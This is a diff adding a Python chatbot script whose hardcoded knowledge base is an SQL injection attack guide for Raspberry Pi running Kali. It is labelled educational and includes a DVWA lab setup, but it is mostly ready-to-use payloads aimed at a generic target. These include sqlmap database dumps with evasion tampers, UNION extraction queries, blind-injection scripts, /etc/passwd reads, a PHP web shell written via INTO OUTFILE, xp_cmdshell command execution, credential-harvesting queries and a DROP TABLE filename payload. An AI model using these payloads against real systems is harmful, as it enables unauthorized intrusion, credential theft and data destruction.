@@ -1,0 +1,354 @@
+import json
+import os
+import random
+from datetime import datetime
+
+class EnhancedCyberAssistant:
+    def __init__(self):
+        self.knowledge_base = self.load_comprehensive_knowledge()
+        print("🔥 Enhanced Cybersecurity Assistant - Raspberry Pi Optimized")
+        print("🎯 Purpose: Educational Cybersecurity Research")
+        
+    def load_comprehensive_knowledge(self):
+        """Load comprehensive cybersecurity knowledge base"""
+        return {
+            "sql_injection_pi": {
+                "overview": """
+SQL INJECTION ON RASPBERRY PI 5 RUNNING KALI LINUX
+
+HARDWARE CONSIDERATIONS:
+- ARM64 architecture optimization
+- 8GB RAM enables complex attack scenarios
+- GPIO pins for hardware-based attacks
+- Network interfaces for man-in-the-middle
+
+KALI TOOLS OPTIMIZED FOR PI:
+- sqlmap (ARM64 compiled)
+- Burp Suite Community (Java-based, works well)
+- Custom Python scripts (native performance)
+- Browser-based tools (Chromium ARM64)
+""",
+                "setup": """
+RASPBERRY PI 5 SQL INJECTION TESTING SETUP:
+
+1. ENVIRONMENT PREPARATION:
+   sudo apt update && sudo apt upgrade
+   sudo apt install sqlmap burpsuite python3-pip
+   pip3 install requests beautifulsoup4 selenium
+
+2. VULNERABLE LAB SETUP:
+   # Install DVWA (Damn Vulnerable Web Application)
+   cd /opt
+   sudo git clone https://github.com/digininja/DVWA.git
+   sudo chmod -R 755 DVWA/
+   
+   # Setup Apache and MySQL
+   sudo systemctl start apache2 mysql
+   sudo mysql -e "CREATE DATABASE dvwa;"
+   sudo mysql -e "CREATE USER 'dvwa'@'localhost' IDENTIFIED BY 'password';"
+   sudo mysql -e "GRANT ALL PRIVILEGES ON dvwa.* TO 'dvwa'@'localhost';"
+
+3. NETWORK CONFIGURATION:
+   # Enable monitor mode for wireless testing
+   sudo airmon-ng start wlan0
+   # Setup NAT for testing isolated networks
+   sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
+""",
+                "techniques": """
+ADVANCED SQL INJECTION TECHNIQUES FOR PI:
+
+1. AUTOMATED DISCOVERY:
+   # Basic sqlmap scan
+   sqlmap -u "http://target/page.php?id=1" --batch --banner
+   
+   # Comprehensive database enumeration
+   sqlmap -u "http://target/page.php?id=1" --dbs --tables --columns --dump
+   
+   # Advanced evasion
+   sqlmap -u "http://target/page.php?id=1" --tamper=space2comment,charencode --random-agent
+
+2. MANUAL TESTING WORKFLOW:
+   # Step 1: Identify injection points
+   # Test: page.php?id=1' (look for errors)
+   # Test: page.php?id=1 AND 1=1 (should work normally)
+   # Test: page.php?id=1 AND 1=2 (should break/differ)
+   
+   # Step 2: Determine number of columns
+   # ' ORDER BY 1-- (increment until error)
+   # ' UNION SELECT NULL-- (match column count)
+   
+   # Step 3: Find injectable columns
+   # ' UNION SELECT 1,2,3,4-- (see which numbers display)
+   
+   # Step 4: Extract information
+   # ' UNION SELECT 1,database(),version(),4--
+   # ' UNION SELECT 1,table_name,3,4 FROM information_schema.tables--
+
+3. BLIND SQL INJECTION:
+   # Boolean-based blind injection
+   ' AND (SELECT SUBSTRING(database(),1,1))='d'--
+   
+   # Time-based blind injection
+   ' AND (SELECT IF(SUBSTRING(database(),1,1)='d',SLEEP(5),0))--
+   
+   # Binary search optimization for Pi
+   import time, requests
+   
+   def binary_search_blind(url, payload_template):
+       charset = "0123456789abcdefghijklmnopqrstuvwxyz"
+       result = ""
+       for position in range(1, 50):  # Adjust range as needed
+           for char in charset:
+               payload = payload_template.format(pos=position, char=char)
+               start_time = time.time()
+               response = requests.get(url + payload)
+               response_time = time.time() - start_time
+               if response_time > 4:  # Time-based detection
+                   result += char
+                   break
+       return result
+
+4. DATABASE-SPECIFIC TECHNIQUES:
+   
+   MYSQL:
+   # Version detection
+   ' UNION SELECT @@version,2,3--
+   # File reading (if file_priv enabled)
+   ' UNION SELECT LOAD_FILE('/etc/passwd'),2,3--
+   # File writing
+   ' UNION SELECT 'web shell code',2,3 INTO OUTFILE '/var/www/shell.php'--
+   
+   POSTGRESQL:
+   # Version detection
+   ' UNION SELECT version(),2,3--
+   # Command execution (if superuser)
+   '; COPY (SELECT '') TO PROGRAM 'id'--
+   
+   SQLITE:
+   # Schema enumeration
+   ' UNION SELECT sql,2,3 FROM sqlite_master--
+   
+   MSSQL:
+   # Version detection
+   ' UNION SELECT @@version,2,3--
+   # Command execution
+   '; EXEC xp_cmdshell 'whoami'--
+
+5. EVASION TECHNIQUES:
+   
+   # Comment variations
+   /*comment*/ --comment #comment
+   
+   # Case variations
+   UnIoN SeLeCt
+   
+   # Encoding
+   %27%20UNION%20SELECT  (URL encoding)
+   0x27205553494F4E2053454C454354  (Hex encoding)
+   
+   # Alternative syntax
+   UNION ALL SELECT vs UNION SELECT
+   AND vs &&
+   OR vs ||
+
+6. POST-EXPLOITATION:
+   
+   # Web shell upload (MySQL)
+   ' UNION SELECT '<?php system($_GET["c"]); ?>',2,3 INTO OUTFILE '/var/www/html/shell.php'--
+   
+   # Database user escalation
+   ' UNION SELECT grantee,privilege_type,3 FROM information_schema.user_privileges--
+   
+   # Credential harvesting
+   ' UNION SELECT username,password,email FROM users--
+""",
+                "raspberry_pi_specific": """
+RASPBERRY PI 5 OPTIMIZATION FOR SQL INJECTION:
+
+1. PERFORMANCE OPTIMIZATION:
+   # Utilize ARM64 architecture
+   export MAKEFLAGS="-j4"  # Use all 4 cores
+   
+   # Memory optimization for large datasets
+   echo 'vm.swappiness=10' | sudo tee -a /etc/sysctl.conf
+   
+   # Network buffer tuning
+   echo 'net.core.rmem_max = 16777216' | sudo tee -a /etc/sysctl.conf
+
+2. CUSTOM SCRIPTS FOR PI:
+   #!/usr/bin/env python3
+   import requests
+   import threading
+   from concurrent.futures import ThreadPoolExecutor
+   
+   class PiSQLInjector:
+       def __init__(self, target_url, threads=4):
+           self.target_url = target_url
+           self.threads = threads
+           
+       def test_injection(self, payload):
+           try:
+               response = requests.get(f"{self.target_url}{payload}", timeout=10)
+               return len(response.content), payload
+           except:
+               return 0, payload
+       
+       def fuzz_parameters(self, payloads):
+           with ThreadPoolExecutor(max_workers=self.threads) as executor:
+               results = list(executor.map(self.test_injection, payloads))
+           return results
+
+3. GPIO-BASED ATTACKS:
+   # Use GPIO pins for timing attacks
+   import RPi.GPIO as GPIO
+   
+   def hardware_timing_attack():
+       GPIO.setmode(GPIO.BCM)
+       GPIO.setup(18, GPIO.OUT)
+       # Use LED/buzzer to indicate successful injection timing
+       
+4. WIRELESS INJECTION TESTING:
+   # Setup access point for victim testing
+   sudo hostapd /etc/hostapd/hostapd.conf &
+   sudo dnsmasq -C /etc/dnsmasq.conf &
+   
+   # Capture and analyze traffic
+   sudo tcpdump -i wlan0mon -w sqli_traffic.pcap
+
+5. HEADLESS OPERATION:
+   # VNC setup for remote GUI access
+   sudo systemctl enable vncserver@1.service
+   
+   # SSH tunneling for Burp Suite
+   ssh -L 8080:localhost:8080 pi@raspberry_pi_ip
+""",
+                "advanced_scenarios": """
+ADVANCED SQL INJECTION SCENARIOS:
+
+1. SECOND-ORDER INJECTION:
+   # Stage 1: Insert malicious data
+   INSERT INTO users (username) VALUES ('admin\'--')
+   
+   # Stage 2: Trigger injection in different context
+   SELECT * FROM logs WHERE username = 'admin'--'
+
+2. NOSQL INJECTION:
+   # MongoDB injection
+   {"username": {"$ne": ""}, "password": {"$ne": ""}}
+   
+   # CouchDB injection
+   /db/_design/test/_view/users?key="admin"||true||"
+
+3. HEADER INJECTION:
+   # X-Forwarded-For
+   X-Forwarded-For: ' UNION SELECT user(),2,3--
+   
+   # User-Agent
+   User-Agent: Mozilla/5.0' UNION SELECT database(),2,3--
+
+4. FILE UPLOAD + SQL INJECTION:
+   # Upload file with SQL payload in filename
+   filename: image'; DROP TABLE users; --.jpg
+
+5. JSON/XML INJECTION:
+   # JSON
+   {"id": "1' UNION SELECT user(),2,3--"}
+   
+   # XML
+   <user><id>1' UNION SELECT user(),2,3--</id></user>
+"""
+            }
+        }
+    
+    def generate_detailed_response(self, query):
+        """Generate comprehensive responses based on query"""
+        query_lower = query.lower()
+        
+        if "sql injection" in query_lower and ("raspberry" in query_lower or "pi" in query_lower):
+            # Combine all SQL injection knowledge for comprehensive response
+            response = "🔥 COMPREHENSIVE SQL INJECTION GUIDE FOR RASPBERRY PI 5\n"
+            response += "=" * 60 + "\n\n"
+            
+            for section_name, content in self.knowledge_base["sql_injection_pi"].items():
+                response += f"📍 {section_name.upper().replace('_', ' ')}\n"
+                response += "-" * 40 + "\n"
+                response += content + "\n\n"
+            
+            return response
+        
+        elif "sql" in query_lower:
+            return self.knowledge_base["sql_injection_pi"]["techniques"]
+        
+        else:
+            return f"""
+🔥 ENHANCED CYBERSECURITY ASSISTANT
+
+Query: "{query}"
+
+I provide comprehensive, educational cybersecurity information for:
+
+🎯 PENETRATION TESTING:
+- SQL injection (all databases)
+- XSS and web application security
+- Network penetration testing
+- Wireless security assessment
+
+🛠️ RASPBERRY PI OPTIMIZATION:
+- ARM64 architecture considerations
+- Hardware-accelerated attacks
+- GPIO-based testing methods
+- Headless operation techniques
+
+🔍 RECONNAISSANCE & ENUMERATION:
+- Network scanning optimization
+- Service fingerprinting
+- Information gathering
+- Target profiling
+
+📚 EDUCATIONAL SCENARIOS:
+- Vulnerable application setup
+- Testing methodologies
+- Defense strategies
+- Real-world case studies
+
+What specific cybersecurity topic would you like to explore in detail?
+"""
+    
+    def start_assistant(self):
+        """Start the enhanced cybersecurity assistant"""
+        print("\n" + "🔥" * 20)
+        print("💻 ENHANCED CYBERSECURITY ASSISTANT")
+        print("🔥" * 20)
+        print("🎯 Optimized for: Raspberry Pi 5 + Kali Linux")
+        print("📚 Purpose: Educational Cybersecurity Research")
+        print("⚡ Features: Comprehensive, Detailed Responses")
+        print("\nSample queries:")
+        print("- 'SQL injection techniques for web applications'")
+        print("- 'Network scanning with nmap optimization'") 
+        print("- 'XSS attack vectors and prevention'")
+        print("- 'Wireless security testing methods'")
+        print("\nType 'exit' to quit")
+        print("-" * 50)
+        
+        while True:
+            try:
+                user_input = input("\n💻 Assistant> ").strip()
+                
+                if user_input.lower() == 'exit':
+                    print("👋 Session ended")
+                    break
+                elif not user_input:
+                    continue
+                
+                response = self.generate_detailed_response(user_input)
+                print(f"\n{response}")
+                
+            except KeyboardInterrupt:
+                print("\n👋 Session interrupted")
+                break
+            except Exception as e:
+                print(f"❌ Error: {e}")
+
+if __name__ == "__main__":
+    assistant = EnhancedCyberAssistant()
+    assistant.start_assistant()
